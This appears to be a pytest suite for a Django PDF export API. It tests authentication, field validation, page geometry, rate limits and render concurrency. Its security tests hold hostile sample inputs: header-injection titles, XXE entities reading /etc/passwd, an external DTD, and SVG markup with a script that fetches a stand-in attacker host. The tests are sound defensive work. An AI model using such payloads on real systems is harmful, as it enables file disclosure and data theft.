import json
import threading

import pytest
from django.core.files.base import ContentFile
from django.core.files.storage import default_storage
from rest_framework.test import APIClient
from rest_framework.throttling import ScopedRateThrottle

from apps.exports import renderer, serializers
from apps.exports.exceptions import ExportBusy, ExportFailed, ExportTimeout, ExportUnavailable
from apps.exports.layout import fmt
from apps.exports.services import ExportRequest

from .conftest import FAKE_PDF
from .helpers import build_test_font, payload, svg_page, upload

URL = "/api/v1/exports/pdf/"


def post(client, pages=None, **fields):
    pages = [svg_page()] if pages is None else pages
    return client.post(URL, payload(pages, **fields), format="multipart")


# ---- access -------------------------------------------------------------------------------


def test_anonymous_users_get_401(anon, render_calls):
    response = post(anon)
    assert response.status_code == 401
    assert response.json()["error"]["code"] in {"not_authenticated", "authentication_failed"}
    assert render_calls == []


def test_csrf_is_enforced_for_session_users(user, render_calls):
    api = APIClient(enforce_csrf_checks=True)
    api.force_login(user)
    assert post(api).status_code in (401, 403)
    assert render_calls == []


def test_feature_flag_off_disables_the_endpoint(client, render_calls, settings):
    settings.SERVER_PDF_ENABLED = False
    response = post(client)
    assert response.status_code == 404
    assert response.json()["error"]["code"] == "server_pdf_disabled"
    assert render_calls == []


# ---- happy path (stubbed browser) ----------------------------------------------------------


def test_success_returns_a_pdf_attachment(client, render_calls):
    response = post(client, title="Summer sale")
    assert response.status_code == 200
    assert response["Content-Type"] == "application/pdf"
    assert response["Content-Disposition"] == 'attachment; filename="Summer sale.pdf"'
    assert response["X-Content-Type-Options"] == "nosniff"
    assert "no-store" in response["Cache-Control"]
    assert response.content == FAKE_PDF
    assert len(render_calls) == 1


def test_unicode_titles_use_rfc6266_encoding(client, render_calls):
    response = post(client, title="Café ☕ menu")
    assert "filename*=utf-8''Caf%C3%A9%20menu.pdf" in response["Content-Disposition"]


def test_hostile_titles_cannot_inject_headers(client, render_calls):
    response = post(client, title='x"; filename="evil.exe\r\nSet-Cookie: a=b')
    assert response.status_code == 200
    assert "Set-Cookie" not in response.headers
    assert "evil.exe" not in response["Content-Disposition"].split("filename=")[0]
    assert "\r" not in response["Content-Disposition"] and "\n" not in response["Content-Disposition"]


def test_default_filename(client, render_calls):
    assert post(client)["Content-Disposition"] == 'attachment; filename="design.pdf"'


@pytest.mark.parametrize("accept", ["application/pdf", "text/html", "*/*", "image/png"])
def test_accept_header_never_causes_406(client, render_calls, accept):
    assert client.post(URL, payload([svg_page()]), format="multipart", HTTP_ACCEPT=accept).status_code == 200


def test_page_geometry_reaches_the_renderer(client, render_calls):
    post(client, pages=[svg_page(), svg_page()], width=800, height=600, bleed_mm=3, crop_marks="true")
    call = render_calls[0]
    assert call["width_px"] == pytest.approx(800 + 2 * (3 * 96 / 25.4 + 6 * 96 / 25.4))
    assert call["html"].count('<section class="page ') == 2
    assert call["html"].count('class="marks"') == 2


def test_pages_are_printed_in_upload_order(client, render_calls):
    post(client, pages=[svg_page(fill="#111111"), svg_page(fill="#222222"), svg_page(fill="#333333")])
    html = render_calls[0]["html"]
    assert html.index("#111111") < html.index("#222222") < html.index("#333333")


def test_booklet_upload_prints_two_pages_per_a4_sheet_side(client, render_calls):
    pages = [svg_page(fill=f"#{number:06x}") for number in range(1, 5)]
    response = post(client, pages=pages, width=559, height=794, layout="booklet")
    assert response.status_code == 200
    call = render_calls[0]
    assert call["html"].count('<section class="page">') == 2
    assert call["html"].index("#000004") < call["html"].index("#000001")
    assert call["width_px"] == pytest.approx(297 * 96 / 25.4)


def test_folded_upload_rejects_bleed(client, render_calls):
    response = post(client, width=559, height=794, layout="booklet", bleed_mm=3)
    assert response.status_code == 400
    assert response.json()["error"]["code"] == "invalid_imposition"
    assert render_calls == []


def test_front_only_upload_omits_back_sheet_sides(client, render_calls):
    pages = [svg_page(fill=f"#{number:06x}") for number in range(1, 5)]
    response = post(client, pages=pages, width=559, height=794, layout="booklet", print_sides="front")
    assert response.status_code == 200
    html = render_calls[0]["html"]
    assert html.count('<section class="page">') == 1
    assert "#000004" in html and "#000001" in html
    assert "#000002" not in html and "#000003" not in html
    assert 'filename="design-booklet-front.pdf"' in response["Content-Disposition"]


def test_fonts_are_inlined_into_the_document(client, render_calls, db):
    name = default_storage.save("fonts/api-test.ttf", ContentFile(build_test_font()))
    try:
        fonts = json.dumps([{"family": "Doory Test Sans", "url": f"/media/{name}", "weight": 700}])
        assert post(client, fonts=fonts).status_code == 200
    finally:
        default_storage.delete(name)
    html = render_calls[0]["html"]
    assert (
        '@font-face{font-family:"Doory Test Sans";font-weight:700;font-style:normal;src:url("data:font/ttf;base64,'
        in html
    )


@pytest.mark.parametrize(
    "fonts",
    [
        "not json",
        '{"family": "x"}',
        '[{"family": "x"}]',
        '[{"family": "<b>", "url": "/media/a.ttf"}]',
        '[{"family": "ok", "url": "/media/a.ttf", "weight": 0}]',
        '[{"family": "ok", "url": "/media/a.ttf", "style": "oblique"}]',
        json.dumps([{"family": "ok", "url": "/media/a.ttf"}] * 33),
        "[" * 5000,
    ],
)
def test_invalid_font_lists_are_rejected(client, render_calls, fonts):
    response = post(client, fonts=fonts)
    assert response.status_code == 400
    assert "fonts" in response.json()["error"]["fields"]


@pytest.mark.parametrize(
    "url", ["/media/fonts/missing.ttf", "/static/x.ttf", "http://evil.example/media/a.ttf", "/media/../x.ttf"]
)
def test_fonts_outside_media_storage_are_rejected(client, render_calls, url):
    response = post(client, fonts=json.dumps([{"family": "Evil", "url": url}]))
    assert response.status_code == 400
    assert response.json()["error"]["code"] == "invalid_font"
    assert render_calls == []


# ---- field validation ---------------------------------------------------------------------


def test_pages_are_required(client, render_calls):
    response = client.post(URL, {"width": 100, "height": 100}, format="multipart")
    assert response.status_code == 400
    assert "pages" in response.json()["error"]["fields"]


@pytest.mark.parametrize("field", ["width", "height"])
@pytest.mark.parametrize("value", [0, -5, 0.5, 20001, "abc", "nan", "inf", "-inf", ""])
def test_invalid_sizes(client, render_calls, field, value):
    response = post(client, **{field: value})
    assert response.status_code == 400
    assert field in response.json()["error"]["fields"]
    assert render_calls == []


@pytest.mark.parametrize("value", [1, 20000, 1080.5])
def test_boundary_sizes_are_accepted(client, render_calls, value):
    assert post(client, width=value, height=value).status_code == 200


@pytest.mark.parametrize("value", [-1, 10.5, 11, "nan", "inf", "x"])
def test_invalid_bleed(client, render_calls, value):
    response = post(client, bleed_mm=value)
    assert response.status_code == 400
    assert "bleed_mm" in response.json()["error"]["fields"]


@pytest.mark.parametrize("value", [0, 3, 10, 2.5])
def test_valid_bleed(client, render_calls, value):
    assert post(client, bleed_mm=value).status_code == 200


def test_crop_marks_must_be_a_boolean(client, render_calls):
    assert post(client, crop_marks="maybe").status_code == 400
    assert post(client, crop_marks="false").status_code == 200
    assert "marks" not in render_calls[-1]["html"].split("<body>")[1]


def test_title_length_is_capped(client, render_calls):
    assert post(client, title="x" * 201).status_code == 400
    assert post(client, title="x" * 200).status_code == 200


def test_unknown_fields_are_ignored(client, render_calls):
    assert post(client, width=100, height=100, user="1", is_admin="true").status_code == 200


# ---- per-page sizes, language -------------------------------------------------------------


def sizes_json(*sizes):
    return json.dumps([{"width": w, "height": h} for w, h in sizes])


def test_sizes_give_each_page_its_own_geometry(client, render_calls):
    pages = [svg_page(), svg_page(), svg_page()]
    response = post(
        client, pages=pages, width=400, height=300, sizes=sizes_json((400, 300), (794, 1123), (336, 192))
    )
    assert response.status_code == 200
    html = render_calls[0]["html"]
    assert html.count("@page p") == 3
    assert f"@page p1{{size:{fmt(794 + 4 / 3)}px {fmt(1123 + 4 / 3)}px;margin:0}}" in html
    assert f"@page p2{{size:{fmt(336 + 4 / 3)}px {fmt(192 + 4 / 3)}px;margin:0}}" in html
    assert html.count('<section class="page p0">') == 1
    assert [html.count(f'<section class="page p{i}">') for i in range(3)] == [1, 1, 1]
    # the browser is started at the first page's size
    assert (render_calls[0]["width_px"], render_calls[0]["height_px"]) == (400, 300)


def test_equal_sizes_need_no_named_pages(client, render_calls):
    post(client, pages=[svg_page(), svg_page()], sizes=sizes_json((400, 300), (400, 300)))
    assert "@page p" not in render_calls[0]["html"]
    assert "page:p" not in render_calls[0]["html"]


def test_bleed_and_marks_apply_to_every_page_of_its_own_size(client, render_calls):
    post(
        client,
        pages=[svg_page(), svg_page()],
        sizes=sizes_json((400, 300), (200, 500)),
        bleed_mm=3,
        crop_marks="true",
    )
    html = render_calls[0]["html"]
    margin = (3 + 6) * 96 / 25.4
    extra = 4 / 3
    assert (
        f"@page{{size:{fmt(400 + 2 * margin + extra)}px {fmt(300 + 2 * margin + extra)}px;margin:0}}" in html
    )
    assert (
        f"@page p1{{size:{fmt(200 + 2 * margin + extra)}px {fmt(500 + 2 * margin + extra)}px;margin:0}}"
        in html
    )
    assert html.count('class="marks"') == 2


def test_without_sizes_every_page_uses_width_and_height(client, render_calls):
    post(client, pages=[svg_page(), svg_page(), svg_page()], width=640, height=480)
    html = render_calls[0]["html"]
    assert f"@page{{size:{fmt(640 + 4 / 3)}px {fmt(480 + 4 / 3)}px;margin:0}}" in html
    assert "@page p" not in html


@pytest.mark.parametrize("value", ["", "   "])
def test_blank_sizes_mean_absent(client, render_calls, value):
    assert post(client, sizes=value).status_code == 200


def test_sizes_must_list_one_size_per_page(client, render_calls):
    for sizes in (sizes_json((10, 10)), sizes_json((10, 10), (10, 10), (10, 10))):
        response = post(client, pages=[svg_page(), svg_page()], sizes=sizes)
        assert response.status_code == 400
        error = response.json()["error"]
        assert error["code"] == "validation_error"
        assert "sizes" in error["fields"] and "one size per page" in error["fields"]["sizes"][0]
    assert render_calls == []


@pytest.mark.parametrize(
    "sizes",
    [
        "not json",
        "{}",
        '{"width": 10, "height": 10}',
        "5",
        '"x"',
        "[5]",
        '["a"]',
        "[null]",
        '[{"width": 10}]',
        '[{"height": 10}]',
        '[{"width": 0, "height": 10}]',
        '[{"width": 10, "height": 0}]',
        '[{"width": -1, "height": 10}]',
        '[{"width": 20001, "height": 10}]',
        '[{"width": 10, "height": 20001}]',
        '[{"width": "abc", "height": 10}]',
        '[{"width": NaN, "height": 10}]',
        '[{"width": Infinity, "height": 10}]',
        '[{"width": null, "height": 10}]',
        "[" * 5000,
    ],
)
def test_invalid_sizes_are_rejected_on_the_sizes_field(client, render_calls, sizes):
    response = post(client, pages=[svg_page()], sizes=sizes)
    assert response.status_code == 400
    assert response.json()["error"]["code"] == "validation_error"
    assert "sizes" in response.json()["error"]["fields"]
    assert render_calls == []


def test_the_sizes_field_is_capped(client, render_calls):
    response = post(client, sizes="[" + "1," * serializers.MAX_SIZES_BYTES + "1]")
    assert response.status_code == 400
    assert "sizes" in response.json()["error"]["fields"]


@pytest.mark.parametrize("value", [1, 20000, 1080.5])
def test_boundary_page_sizes_are_accepted(client, render_calls, value):
    assert post(client, sizes=sizes_json((value, value))).status_code == 200


def test_one_hundred_different_sizes(client, render_calls):
    sizes = [(100 + i, 50 + i) for i in range(100)]
    response = post(client, pages=[svg_page(10, 10)] * 100, sizes=sizes_json(*sizes))
    assert response.status_code == 200
    assert render_calls[0]["html"].count("@page p") == 100


@pytest.mark.parametrize("lang", ["en", "en-GB", "de", "zh-Hant-TW", "fil"])
def test_language_reaches_the_document(client, render_calls, lang):
    assert post(client, lang=lang).status_code == 200
    assert f'<html lang="{lang}">' in render_calls[-1]["html"]


@pytest.mark.parametrize("lang", ["x", "english-language-tag-too-long", 'en"><script>', "en_GB", "1234"])
def test_invalid_language_is_rejected(client, render_calls, lang):
    response = post(client, lang=lang)
    assert response.status_code == 400
    assert "lang" in response.json()["error"]["fields"]


@pytest.mark.parametrize("fields", [{}, {"lang": ""}])
def test_the_default_language_is_english(client, render_calls, fields):
    post(client, **fields)
    assert '<html lang="en">' in render_calls[0]["html"]


# ---- page files ---------------------------------------------------------------------------


def test_one_hundred_pages_are_accepted_and_101_are_not(client, render_calls):
    assert post(client, pages=[svg_page(10, 10)] * 100).status_code == 200
    response = post(client, pages=[svg_page(10, 10)] * 101)
    assert response.status_code == 400
    assert "pages" in response.json()["error"]["fields"]


def test_file_flood_is_rejected_with_the_error_envelope(client, render_calls, settings):
    settings.DATA_UPLOAD_MAX_NUMBER_FILES = 5
    response = post(client, pages=[svg_page(10, 10)] * 6)
    assert response.status_code == 400
    assert "pages" in response.json()["error"]["fields"]


def test_empty_files_are_rejected(client, render_calls):
    response = client.post(URL, {"pages": [upload(b"")], "width": 10, "height": 10}, format="multipart")
    assert response.status_code == 400


def test_page_size_limit(client, render_calls, monkeypatch):
    monkeypatch.setattr(serializers, "MAX_PAGE_BYTES", 600)
    assert post(client, pages=[svg_page(10, 10)]).status_code == 200
    big = svg_page(10, 10, extra="<g/>" * 300)
    response = post(client, pages=[big])
    assert response.status_code == 400
    assert "pages" in response.json()["error"]["fields"]


def test_total_size_limit(client, render_calls, monkeypatch):
    page = svg_page(10, 10)
    monkeypatch.setattr(serializers, "MAX_TOTAL_BYTES", len(page) * 2 + 10)
    assert post(client, pages=[page, page]).status_code == 200
    assert post(client, pages=[page, page, page]).status_code == 400


def test_huge_declared_bodies_are_refused_before_parsing(client, render_calls):
    response = client.post(
        URL, payload([svg_page()]), format="multipart", CONTENT_LENGTH=str(200 * 1024 * 1024)
    )
    assert response.status_code == 413
    assert response.json()["error"]["code"] == "payload_too_large"
    assert render_calls == []


def test_a_json_body_is_not_accepted(client, render_calls):
    response = client.post(URL, {"width": 10, "height": 10}, format="json")
    assert response.status_code == 415


# ---- hostile SVG --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "data",
    [
        b"not xml at all",
        b"\x89PNG\r\n\x1a\n" + b"\x00" * 64,
        b"<html><body>hi</body></html>",
        b"<svg",
        (
            b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;">]>'
            b'<svg xmlns="http://www.w3.org/2000/svg"><text>&b;</text></svg>'
        ),
        (
            b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
        ),
        b'<!DOCTYPE svg SYSTEM "http://evil.example/x.dtd"><svg xmlns="http://www.w3.org/2000/svg"/>',
    ],
)
def test_unsafe_or_invalid_pages_reject_the_whole_request(client, render_calls, data):
    response = post(client, pages=[svg_page(), data])
    assert response.status_code == 400
    assert response.json()["error"]["code"] == "invalid_svg"
    assert "Page 2" in response.json()["error"]["message"]
    assert render_calls == []


def test_hostile_markup_is_stripped_before_it_reaches_the_browser(client, render_calls):
    evil = svg_page(
        extra=(
            '<script>fetch("http://evil.example/steal")</script>'
            '<image href="http://evil.example/track.png" width="10" height="10"/>'
            '<image href="file:///etc/passwd" width="10" height="10"/>'
            '<foreignObject width="10" height="10"><iframe src="file:///etc/passwd" xmlns="http://www.w3.org/1999/xhtml"/></foreignObject>'
            '<rect width="5" height="5" onload="alert(1)" onclick="alert(2)" style="fill:url(http://evil.example/x)"/>'
            "<style>@import url(http://evil.example/x.css); rect{fill:red}</style>"
        )
    )
    assert post(client, pages=[evil]).status_code == 200
    html = render_calls[0]["html"]
    for needle in (
        "evil.example",
        "file:",
        "<script",
        "iframe",
        "foreignObject",
        "onload",
        "onclick",
        "@import",
        "passwd",
    ):
        assert needle not in html, needle


# ---- throttling, concurrency, failures ----------------------------------------------------


def test_upload_rate_limit(client, render_calls, monkeypatch):
    monkeypatch.setitem(ScopedRateThrottle.THROTTLE_RATES, "upload", "2/min")
    assert [post(client).status_code for _ in range(4)] == [200, 200, 429, 429]


def test_rate_limit_is_per_user(user, render_calls, monkeypatch, db):
    from apps.accounts.models import User

    monkeypatch.setitem(ScopedRateThrottle.THROTTLE_RATES, "upload", "1/min")
    other = User.objects.create_user("other@example.com", "other-pass-123")
    first, second = APIClient(), APIClient()
    first.force_authenticate(user)
    second.force_authenticate(other)
    assert post(first).status_code == 200
    assert post(first).status_code == 429
    assert post(second).status_code == 200


def test_busy_server_answers_503_with_retry_after(client, render_calls, settings):
    settings.EXPORT_MAX_CONCURRENCY = 1
    with renderer.render_slot():
        response = post(client)
    assert response.status_code == 503
    assert response.json()["error"]["code"] == "export_busy"
    assert int(response["Retry-After"]) >= 1
    assert render_calls == []
    assert post(client).status_code == 200  # slot is free again


@pytest.mark.parametrize(
    ("error", "status", "code"),
    [
        (ExportTimeout, 504, "export_timeout"),
        (ExportUnavailable, 503, "export_unavailable"),
        (ExportFailed, 500, "export_failed"),
    ],
)
def test_renderer_failures_map_to_clean_errors(client, monkeypatch, settings, error, status, code):
    def boom(html, **kwargs):
        raise error

    monkeypatch.setattr("apps.exports.services.render_pdf", boom)
    response = post(client)
    assert response.status_code == status
    assert response.json()["error"]["code"] == code
    assert "Traceback" not in response.content.decode()
    with renderer.render_slot():  # the slot was released
        pass


def test_unexpected_crashes_release_the_slot(client, monkeypatch, settings):
    settings.EXPORT_MAX_CONCURRENCY = 1

    def boom(html, **kwargs):
        raise RuntimeError("kaboom")

    monkeypatch.setattr("apps.exports.services.render_pdf", boom)
    with pytest.raises(RuntimeError):
        post(client)
    with renderer.render_slot():
        pass


def test_invalid_input_never_takes_a_slot(client, render_calls, settings):
    settings.EXPORT_MAX_CONCURRENCY = 1
    with renderer.render_slot():
        assert post(client, width=0).status_code == 400  # validation answers before the busy check


def test_render_slot_is_shared_across_threads(settings):
    settings.EXPORT_MAX_CONCURRENCY = 2
    outcome: list[str] = []

    def attempt():
        try:
            with renderer.render_slot():
                outcome.append("ran")
        except ExportBusy:
            outcome.append("busy")

    with renderer.render_slot(), renderer.render_slot():
        thread = threading.Thread(target=attempt)
        thread.start()
        thread.join(5)
    thread = threading.Thread(target=attempt)
    thread.start()
    thread.join(5)
    assert outcome == ["busy", "ran"]


def test_never_more_renders_than_slots_under_load(settings):
    settings.EXPORT_MAX_CONCURRENCY = 2
    lock = threading.Lock()
    state = {"inside": 0, "peak": 0, "busy": 0, "ran": 0}
    start = threading.Barrier(8, timeout=10)

    def attempt():
        start.wait()
        try:
            with renderer.render_slot():
                with lock:
                    state["inside"] += 1
                    state["peak"] = max(state["peak"], state["inside"])
                threading.Event().wait(0.05)
                with lock:
                    state["inside"] -= 1
                    state["ran"] += 1
        except ExportBusy:
            with lock:
                state["busy"] += 1

    threads = [threading.Thread(target=attempt) for _ in range(8)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join(10)
    assert state["peak"] <= 2
    assert state["ran"] >= 1 and state["ran"] + state["busy"] == 8


def test_changing_the_concurrency_setting_resizes_the_pool(settings):
    settings.EXPORT_MAX_CONCURRENCY = 1
    with renderer.render_slot():
        settings.EXPORT_MAX_CONCURRENCY = 3
        with renderer.render_slot(), renderer.render_slot():
            pass


def test_export_request_defaults():
    request = ExportRequest(pages=[b"<svg/>"], width=1, height=1)
    assert (request.bleed_mm, request.crop_marks, request.title, list(request.fonts)) == (0.0, False, "", [])
    assert request.sizes is None and request.lang == "en"
    assert request.page_sizes() == [(1, 1)]


def test_export_request_sizes_win_over_width_and_height():
    request = ExportRequest(pages=[b"a", b"b"], width=1, height=1, sizes=[(5, 6), (7, 8)])
    assert request.page_sizes() == [(5, 6), (7, 8)]
    assert ExportRequest(pages=[b"a", b"b"], width=3, height=4).page_sizes() == [(3, 4), (3, 4)]


def test_the_service_refuses_sizes_that_do_not_match_the_pages(render_calls):
    from apps.exports.exceptions import InvalidExport
    from apps.exports.services import export_pdf

    request = ExportRequest(pages=[svg_page(), svg_page()], width=10, height=10, sizes=[(10, 10)])
    with pytest.raises(InvalidExport) as raised:
        export_pdf(request)
    assert raised.value.detail.code == "invalid_sizes"
    assert render_calls == []


def test_one_account_holds_one_render_slot_at_a_time(settings):
    settings.EXPORT_MAX_CONCURRENCY = 2
    with renderer.render_slot("alice"):
        with pytest.raises(ExportBusy), renderer.render_slot("alice"):
            pass
        with renderer.render_slot("bob"):  # somebody else still gets the second slot
            pass
    with renderer.render_slot("alice"):  # and the first account can go again once its render is done
        pass


def test_an_account_whose_render_failed_can_export_again(settings):
    settings.EXPORT_MAX_CONCURRENCY = 2
    with pytest.raises(RuntimeError), renderer.render_slot("alice"):
        raise RuntimeError("kaboom")
    with renderer.render_slot("alice"):
        pass
